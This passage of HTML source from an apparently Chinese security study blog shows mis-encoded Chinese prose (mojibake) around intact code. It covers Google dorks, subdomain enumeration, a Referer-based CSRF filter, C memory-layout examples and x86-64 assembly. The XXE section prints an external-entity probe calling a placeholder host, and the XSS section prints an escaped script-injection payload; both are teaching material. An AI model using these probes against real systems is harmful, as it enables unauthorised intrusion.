href="#6-è°·æ­Œè¯­æ³•ï¼šè¯†åˆ«æŒ‡çº¹çš„æ—¶å€™ï¼Œå¦‚ä½•æœç´¢è·¯å¾„" class="headerlink" title="6. è°·æ­Œè¯­æ³•ï¼šè¯†åˆ«æŒ‡çº¹çš„æ—¶å€™ï¼Œå¦‚ä½•æœç´¢è·¯å¾„"></a>6. è°·æ­Œè¯­æ³•ï¼šè¯†åˆ«æŒ‡çº¹çš„æ—¶å€™ï¼Œå¦‚ä½•æœç´¢è·¯å¾„</h3><ul><li>ä½¿ç”¨<code>inurl:</code>è¯­æ³•ï¼šä¾‹å¦‚<code>inurl:/admin</code>ï¼Œå¯ä»¥æŸ¥æ‰¾åŒ…å«<code>/admin</code>è·¯å¾„çš„URLã€‚</li><li>ä½¿ç”¨<code>intext:</code>è¯­æ³•ï¼šä¾‹å¦‚<code>intext:login</code>ï¼Œå¯ä»¥æŸ¥æ‰¾åŒ…å«<code>login</code>çš„æ–‡æœ¬å†…å®¹ã€‚</li></ul><h3 id="7-è°·æ­Œè¯­æ³•ï¼šå¦‚ä½•æœç´¢å‰ç«¯æºç çš„æŒ‡çº¹"><a href="#7-è°·æ­Œè¯­æ³•ï¼šå¦‚ä½•æœç´¢å‰ç«¯æºç çš„æŒ‡çº¹" class="headerlink" title="7. è°·æ­Œè¯­æ³•ï¼šå¦‚ä½•æœç´¢å‰ç«¯æºç çš„æŒ‡çº¹"></a>7. è°·æ­Œè¯­æ³•ï¼šå¦‚ä½•æœç´¢å‰ç«¯æºç çš„æŒ‡çº¹</h3><ul><li>ä½¿ç”¨<code>site:</code>å’Œ<code>inurl:</code>ç»„åˆï¼šä¾‹å¦‚<code>site:example.com inurl:js</code>ï¼Œå¯ä»¥æŸ¥æ‰¾example.comçš„JavaScriptæ–‡ä»¶ã€‚</li><li>ä½¿ç”¨<code>intext:</code>è¯­æ³•ï¼šä¾‹å¦‚<code>intext:jQuery</code>ï¼Œå¯ä»¥æŸ¥æ‰¾åŒ…å«<code>jQuery</code>çš„æ–‡æœ¬å†…å®¹ã€‚</li></ul><h3 id="8-æ€ä¹ˆé€šè¿‡IPåæŸ¥åŸŸå"><a href="#8-æ€ä¹ˆé€šè¿‡IPåæŸ¥åŸŸå" class="headerlink" title="8. æ€ä¹ˆé€šè¿‡IPåæŸ¥åŸŸå"></a>8. æ€ä¹ˆé€šè¿‡IPåæŸ¥åŸŸå</h3><ul><li>ä½¿ç”¨åœ¨çº¿å·¥å…·ï¼šå¦‚<code>MXToolbox</code>æˆ–<code>DNS Lookup</code>å·¥å…·ã€‚</li><li>ä½¿ç”¨å‘½ä»¤è¡Œå·¥å…·ï¼šå¦‚<code>nslookup</code>æˆ–<code>dig</code>ï¼Œä¾‹å¦‚<code>nslookup 1.2.3.4</code>ã€‚</li></ul><h3 id="9-ä¿¡æ¯æ”¶é›†ä¸­å­åŸŸåçš„æ”¶é›†æ‰‹æ®µ"><a href="#9-ä¿¡æ¯æ”¶é›†ä¸­å­åŸŸåçš„æ”¶é›†æ‰‹æ®µ" class="headerlink" title="9. ä¿¡æ¯æ”¶é›†ä¸­å­åŸŸåçš„æ”¶é›†æ‰‹æ®µ"></a>9. ä¿¡æ¯æ”¶é›†ä¸­å­åŸŸåçš„æ”¶é›†æ‰‹æ®µ</h3><ul><li>ä½¿ç”¨å­åŸŸåæšä¸¾å·¥å…·ï¼šå¦‚<code>Sublist3r</code>ã€<code>Amass</code>ç­‰ã€‚</li><li>åˆ©ç”¨æœç´¢å¼•æ“ï¼šä½¿ç”¨è°·æ­Œè¯­æ³•ï¼ˆå¦‚<code>site:example.com</code>ï¼‰ã€‚</li><li>åˆ©ç”¨DNSæŸ¥è¯¢å·¥å…·ï¼šå¦‚<code>dig</code>æˆ–<code>nslookup</code>ï¼ŒæŸ¥è¯¢å­åŸŸåè®°å½•ã€‚</li></ul><h3 id="CSRF-é˜²å¾¡"><a href="#CSRF-é˜²å¾¡" class="headerlink" title="CSRF é˜²å¾¡"></a>CSRF é˜²å¾¡</h3><ul><li><strong>Referer éªŒè¯</strong>ï¼šé€šè¿‡æ£€æŸ¥ HTTP è¯·æ±‚å¤´ä¸­çš„ <code>Referer</code> å­—æ®µæ¥åˆ¤æ–­è¯·æ±‚æ˜¯å¦æ¥è‡ªåˆæ³•çš„æ¥æºã€‚</li><li><strong>Referer ä¸ºç©ºçš„é˜²å¾¡</strong>ï¼šå¦‚æœ <code>Referer</code> ä¸ºç©ºï¼Œå¯èƒ½æ˜¯æµè§ˆå™¨ç‰¹æ€§å¯¼è‡´ï¼Œä¹Ÿå¯èƒ½æ˜¯æ”»å‡»è€…æ•…æ„æ„é€ çš„è¯·æ±‚ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥ç»“åˆå…¶ä»–é˜²å¾¡æœºåˆ¶æ¥åˆ¤æ–­è¯·æ±‚çš„åˆæ³•æ€§ã€‚</li></ul><h3 id="XXE-æ— å›æ˜¾æ¢æµ‹"><a href="#XXE-æ— å›æ˜¾æ¢æµ‹" class="headerlink" title="XXE æ— å›æ˜¾æ¢æµ‹"></a>XXE æ— å›æ˜¾æ¢æµ‹</h3><ul><li><strong>DNS éªŒè¯</strong>ï¼šé€šè¿‡æ„é€ åŒ…å«ç‰¹å®šåŸŸåçš„å¤–éƒ¨å®ä½“ï¼Œåˆ©ç”¨ DNS æŸ¥è¯¢æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ XXE æ¼æ´ã€‚</li><li><strong>å†…éƒ¨å®ä½“æ¢æµ‹</strong>ï¼šé€šè¿‡æ¢æµ‹å†…éƒ¨å®ä½“çš„è§£ææƒ…å†µï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨ XXE æ¼æ´ã€‚</li></ul><h3 id="XSS-ç¡¬ç¼–ç åˆ©ç”¨"><a href="#XSS-ç¡¬ç¼–ç åˆ©ç”¨" class="headerlink" title="XSS ç¡¬ç¼–ç åˆ©ç”¨"></a>XSS ç¡¬ç¼–ç åˆ©ç”¨</h3><ul><li><strong>å‰ç«¯ DOM å‹</strong>ï¼šé€šè¿‡ JavaScript ä»£ç è½¬ä¹‰ç‰¹æ®Šç¼–ç ï¼Œå¦‚ <code>\u003c</code>ï¼Œæ¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚</li><li><strong>HTML ä¸­çš„ç‰¹æ®Šç¼–ç æ‰§è¡Œ</strong>ï¼šåœ¨ HTML ä¸­ï¼Œå¦‚æœå…·å¤‡æŸç§æ ‡ç­¾çš„ç‰¹æ€§ï¼Œå¯ä»¥å¯¼è‡´ç‰¹æ®Šç¼–ç æ‰§è¡Œï¼Œä»è€Œå®ç° XSS æ”»å‡»ã€‚</li></ul><h3 id="CSRF-é˜²å¾¡ä»£ç ç¤ºä¾‹"><a href="#CSRF-é˜²å¾¡ä»£ç ç¤ºä¾‹" class="headerlink" title="CSRF é˜²å¾¡ä»£ç ç¤ºä¾‹"></a>CSRF é˜²å¾¡ä»£ç ç¤ºä¾‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CsrfFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">httpRequest</span> <span class="operator">=</span> (HttpServletRequest) request;</span><br><span class="line">        <span class="type">String</span> <span class="variable">referer</span> <span class="operator">=</span> httpRequest.getHeader(<span class="string">&quot;Referer&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (referer != <span class="literal">null</span> &amp;&amp; referer.startsWith(<span class="string">&quot;http://yourdomain.com&quot;</span>)) &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// CSRF æ£€æµ‹å¤±è´¥ï¼Œå¤„ç†é€»è¾‘</span></span><br><span class="line">            ((HttpServletResponse) response).sendError(HttpServletResponse.SC_FORBIDDEN, <span class="string">&quot;CSRF attack detected&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="XXE-æ— å›æ˜¾æ¢æµ‹ä»£ç ç¤ºä¾‹"><a href="#XXE-æ— å›æ˜¾æ¢æµ‹ä»£ç ç¤ºä¾‹" class="headerlink" title="XXE æ— å›æ˜¾æ¢æµ‹ä»£ç ç¤ºä¾‹"></a>XXE æ— å›æ˜¾æ¢æµ‹ä»£ç ç¤ºä¾‹</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://yourdomain.com/xxe-test&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSS-ç¡¬ç¼–ç åˆ©ç”¨ä»£ç ç¤ºä¾‹"><a href="#XSS-ç¡¬ç¼–ç åˆ©ç”¨ä»£ç ç¤ºä¾‹" class="headerlink" title="XSS ç¡¬ç¼–ç åˆ©ç”¨ä»£ç ç¤ºä¾‹"></a>XSS ç¡¬ç¼–ç åˆ©ç”¨ä»£ç ç¤ºä¾‹</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> userInput = <span class="string">&quot;\u003cscript\u003ealert(&#x27;XSS&#x27;)\u003c/script\u003e&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(userInput);</span><br></pre></td></tr></table></figure><h3 id="XSS-è½¬ä¹‰ç‰¹æ®Šç¼–ç æ‰§è¡Œä»£ç ç¤ºä¾‹"><a href="#XSS-è½¬ä¹‰ç‰¹æ®Šç¼–ç æ‰§è¡Œä»£ç ç¤ºä¾‹" class="headerlink" title="XSS è½¬ä¹‰ç‰¹æ®Šç¼–ç æ‰§è¡Œä»£ç ç¤ºä¾‹"></a>XSS è½¬ä¹‰ç‰¹æ®Šç¼–ç æ‰§è¡Œä»£ç ç¤ºä¾‹</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> userInput = <span class="string">&quot;\u003cscript\u003ealert(&#x27;XSS&#x27;)\u003c/script\u003e&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(userInput);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1-Linuxç¨‹åºçš„å†…å­˜å¸ƒå±€"><a href="#1-Linuxç¨‹åºçš„å†…å­˜å¸ƒå±€" class="headerlink" title="1. Linuxç¨‹åºçš„å†…å­˜å¸ƒå±€"></a>1. Linuxç¨‹åºçš„å†…å­˜å¸ƒå±€</h3><p>Linuxç¨‹åºåœ¨è¿è¡Œæ—¶ï¼Œå…¶å†…å­˜å¸ƒå±€é€šå¸¸åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ®µï¼š</p><ul><li><strong>ä»£ç æ®µï¼ˆ.textï¼‰</strong>ï¼šå­˜æ”¾ç¨‹åºçš„å¯æ‰§è¡Œä»£ç ã€‚</li><li><strong>æ•°æ®æ®µï¼ˆ.dataï¼‰</strong>ï¼šå­˜æ”¾å·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ã€‚</li><li><strong>æœªåˆå§‹åŒ–æ•°æ®æ®µï¼ˆ.bssï¼‰</strong>ï¼šå­˜æ”¾æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ã€‚</li><li><strong>å †ï¼ˆHeapï¼‰</strong>ï¼šåŠ¨æ€å†…å­˜åˆ†é…åŒºåŸŸï¼Œç”±<code>malloc</code>ã€<code>calloc</code>ç­‰å‡½æ•°ç®¡ç†ã€‚</li><li><strong>æ ˆï¼ˆStackï¼‰</strong>ï¼šå­˜æ”¾å‡½æ•°è°ƒç”¨æ—¶çš„å±€éƒ¨å˜é‡å’Œè¿”å›åœ°å€ç­‰ã€‚</li></ul><h4 id="ç¤ºä¾‹ä»£ç ï¼š"><a href="#ç¤ºä¾‹ä»£ç ï¼š" class="headerlink" title="ç¤ºä¾‹ä»£ç ï¼š"></a>ç¤ºä¾‹ä»£ç ï¼š</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å…¨å±€å˜é‡ï¼Œå­˜æ”¾åœ¨.dataæ®µ</span></span><br><span class="line"><span class="type">int</span> global_initialized = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡ï¼Œå­˜æ”¾åœ¨.bssæ®µ</span></span><br><span class="line"><span class="type">int</span> global_uninitialized;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">example_function</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// å±€éƒ¨å˜é‡ï¼Œå­˜æ”¾åœ¨æ ˆä¸­</span></span><br><span class="line">    <span class="type">int</span> stack_variable = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack variable: %d\n&quot;</span>, stack_variable);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    example_function();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œå­˜æ”¾åœ¨å †ä¸­</span></span><br><span class="line">    <span class="type">int</span> *heap_variable = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    *heap_variable = <span class="number">20</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Heap variable: %d\n&quot;</span>, *heap_variable);</span><br><span class="line">    <span class="built_in">free</span>(heap_variable);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-dataæ®µå’Œ-bssæ®µå­˜æ”¾çš„æ•°æ®"><a href="#2-dataæ®µå’Œ-bssæ®µå­˜æ”¾çš„æ•°æ®" class="headerlink" title="2. .dataæ®µå’Œ.bssæ®µå­˜æ”¾çš„æ•°æ®"></a>2. .dataæ®µå’Œ.bssæ®µå­˜æ”¾çš„æ•°æ®</h3><ul><li><strong>.dataæ®µ</strong>ï¼šå­˜æ”¾å·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ã€‚</li><li><strong>.bssæ®µ</strong>ï¼šå­˜æ”¾æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ã€‚</li></ul><h4 id="ç¤ºä¾‹ä»£ç ï¼š-1"><a href="#ç¤ºä¾‹ä»£ç ï¼š-1" class="headerlink" title="ç¤ºä¾‹ä»£ç ï¼š"></a>ç¤ºä¾‹ä»£ç ï¼š</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// .dataæ®µ</span></span><br><span class="line"><span class="type">int</span> initialized_global = <span class="number">10</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> initialized_static = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// .bssæ®µ</span></span><br><span class="line"><span class="type">int</span> uninitialized_global;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> uninitialized_static;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// .dataæ®µçš„å˜é‡</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Initialized global: %d\n&quot;</span>, initialized_global);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Initialized static: %d\n&quot;</span>, initialized_static);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// .bssæ®µçš„å˜é‡</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Uninitialized global: %d\n&quot;</span>, uninitialized_global);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Uninitialized static: %d\n&quot;</span>, uninitialized_static);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-å‡½æ•°è°ƒç”¨æ—¶çš„æµç¨‹ã€å‚æ•°ä¼ é€’ã€å¯„å­˜å™¨å’Œæ ˆçš„å˜åŒ–"><a href="#3-å‡½æ•°è°ƒç”¨æ—¶çš„æµç¨‹ã€å‚æ•°ä¼ é€’ã€å¯„å­˜å™¨å’Œæ ˆçš„å˜åŒ–" class="headerlink" title="3. å‡½æ•°è°ƒç”¨æ—¶çš„æµç¨‹ã€å‚æ•°ä¼ é€’ã€å¯„å­˜å™¨å’Œæ ˆçš„å˜åŒ–"></a>3. å‡½æ•°è°ƒç”¨æ—¶çš„æµç¨‹ã€å‚æ•°ä¼ é€’ã€å¯„å­˜å™¨å’Œæ ˆçš„å˜åŒ–</h3><p>å‡½æ•°è°ƒç”¨æ—¶çš„æµç¨‹é€šå¸¸åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p><ol><li><strong>å‚æ•°ä¼ é€’</strong>ï¼šå‚æ•°é€šè¿‡å¯„å­˜å™¨æˆ–æ ˆä¼ é€’ã€‚</li><li><strong>ä¿å­˜è¿”å›åœ°å€</strong>ï¼šå°†è¿”å›åœ°å€å­˜å…¥æ ˆä¸­ã€‚</li><li><strong>åˆ›å»ºæ ˆå¸§</strong>ï¼šä¸ºå±€éƒ¨å˜é‡åˆ†é…æ ˆç©ºé—´ã€‚</li><li><strong>æ‰§è¡Œå‡½æ•°ä½“</strong>ï¼šæ‰§è¡Œå‡½æ•°é€»è¾‘ã€‚</li><li><strong>é”€æ¯æ ˆå¸§</strong>ï¼šé‡Šæ”¾æ ˆç©ºé—´ã€‚</li><li><strong>è¿”å›ç»“æœ</strong>ï¼šå°†ç»“æœå­˜å…¥å¯„å­˜å™¨æˆ–æ ˆä¸­ã€‚</li></ol><h4 id="ç¤ºä¾‹ä»£ç ï¼š-2"><a href="#ç¤ºä¾‹ä»£ç ï¼š-2" class="headerlink" title="ç¤ºä¾‹ä»£ç ï¼š"></a>ç¤ºä¾‹ä»£ç ï¼š</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">example_function</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="type">int</span> local_variable = a + b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result: %d\n&quot;</span>, local_variable);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    example_function(<span class="number">5</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ±‡ç¼–ä»£ç ï¼ˆx86-64ï¼‰ï¼š"><a href="#æ±‡ç¼–ä»£ç ï¼ˆx86-64ï¼‰ï¼š" class="headerlink" title="æ±‡ç¼–ä»£ç ï¼ˆx86_64ï¼‰ï¼š"></a>æ±‡ç¼–ä»£ç ï¼ˆx86_64ï¼‰ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">; mainå‡½æ•°</span><br><span class="line">main:</span><br><span class="line">    push rbp</span><br><span class="line">    mov rbp, rsp</span><br><span class="line">    sub rsp, 16</span><br><span class="line">    mov dword [rbp-4], 5</span><br><span class="line">    mov dword [rbp-8], 3</span><br><span class="line">    mov eax, dword [rbp-4]</span><br><span class="line">    mov edx, dword [rbp-8]</span><br><span class="line">    mov esi, edx</span><br><span class="line">    mov edi, eax</span><br><span class="line">    call example_function</span><br><span class="line">    mov eax, 0</span><br><span class="line">    leave</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">; example_functionå‡½æ•°</span><br><span class="line">example_function:</span><br><span class="line">    push rbp</span><br><span class="line">    mov rbp, rsp</span><br><span class="line">    sub rsp, 16</span><br><span class="line">    mov dword [rbp-4], edi</span><br><span class="line">    mov dword [rbp-8], esi</span><br><span class="line">    mov eax, dword [rbp-4]</span><br><span class="line">    add eax, dword [rbp-8]</span><br><span class="line">    mov dword [rbp-12], eax</span><br><span class="line">    mov eax, dword [rbp-12]</span><br><span class="line">    mov esi, eax</span><br><span class="line">    mov edi, offset .LC0</span><br><span class="line">    call printf</span><br><span class="line">    nop</span><br><span class="line">    leave</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><h3 id="4-ç¨‹åºçš„ç¼–è¯‘å’Œé“¾æ¥"><a href="#4-ç¨‹åºçš„ç¼–è¯‘å’Œé“¾æ¥" class="headerlink" title="4. ç¨‹åºçš„ç¼–è¯‘å’Œé“¾æ¥"></a>4. ç¨‹åºçš„ç¼–è¯‘å’Œé“¾æ¥</h3><h4 id="ç¼–è¯‘è¿‡ç¨‹ï¼š"><a href="#ç¼–è¯‘è¿‡ç¨‹ï¼š" class="headerlink" title="ç¼–è¯‘è¿‡ç¨‹ï¼š"></a>ç¼–è¯‘è¿‡ç¨‹ï¼š</h4><ol><li><strong>é¢„å¤„ç†</strong>ï¼šå¤„ç†å¤´æ–‡ä»¶å’Œå®å®šä¹‰ã€‚</li><li><strong>ç¼–è¯‘</strong>ï¼šå°†é¢„å¤„ç†åçš„ä»£ç ç¼–è¯‘ä¸ºæ±‡ç¼–ä»£ç ã€‚</li><li><strong>æ±‡ç¼–</strong>ï¼šå°†æ±‡ç¼–ä»£ç è½¬æ¢ä¸ºæœºå™¨ç ã€‚</li><li><strong>é“¾æ¥</strong>ï¼šå°†å¤šä¸ªç›®æ ‡æ–‡ä»¶é“¾æ¥æˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚</li></ol><h4 id="ç¤ºä¾‹ä»£ç ï¼š-3"><a href="#ç¤ºä¾‹ä»£ç ï¼š-3" class="headerlink" title="ç¤ºä¾‹ä»£ç ï¼š"></a>ç¤ºä¾‹ä»£ç ï¼š</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;example.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    example_function();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// example.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> EXAMPLE_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXAMPLE_H</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">example_function</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// example.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">example_function</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello from example_function!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ç¼–è¯‘å’Œé“¾æ¥å‘½ä»¤ï¼š"><a href="#ç¼–è¯‘å’Œé“¾æ¥å‘½ä»¤ï¼š" class="headerlink" title="ç¼–è¯‘å’Œé“¾æ¥å‘½ä»¤ï¼š"></a>ç¼–è¯‘å’Œé“¾æ¥å‘½ä»¤ï¼š</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -c main.c -o main.o</span><br><span class="line">gcc -c example.c -o example.o</span><br><span class="line">gcc main.o example.o -o program</span><br></pre></td></tr></table></figure><h4 id="ç¼–è¯‘åŸç†ï¼š"><a href="#ç¼–è¯‘åŸç†ï¼š" class="headerlink" title="ç¼–è¯‘åŸç†ï¼š"></a>ç¼–è¯‘åŸç†ï¼š</h4><ul><li><strong>é¢„å¤„ç†</strong>ï¼šå±•å¼€å¤´æ–‡ä»¶å’Œå®ã€‚</li><li><strong>ç¼–è¯‘</strong>ï¼šå°†Cä»£ç è½¬æ¢ä¸ºæ±‡ç¼–ä»£ç ã€‚</li><li><strong>æ±‡ç¼–</strong>ï¼šå°†æ±‡ç¼–ä»£ç è½¬æ¢ä¸ºæœºå™¨ç ã€‚</li><li><strong>é“¾æ¥</strong>ï¼šå°†å¤šä¸ªç›®æ ‡æ–‡ä»¶åˆå¹¶ä¸ºä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚</li></ul><h4 id="If-Elseè¯­æ³•æ ‘ï¼š"><a href="#If-Elseè¯­æ³•æ ‘ï¼š" class="headerlink" title="If&#x2F;Elseè¯­æ³•æ ‘ï¼š"></a>If&#x2F;Elseè¯­æ³•æ ‘ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span 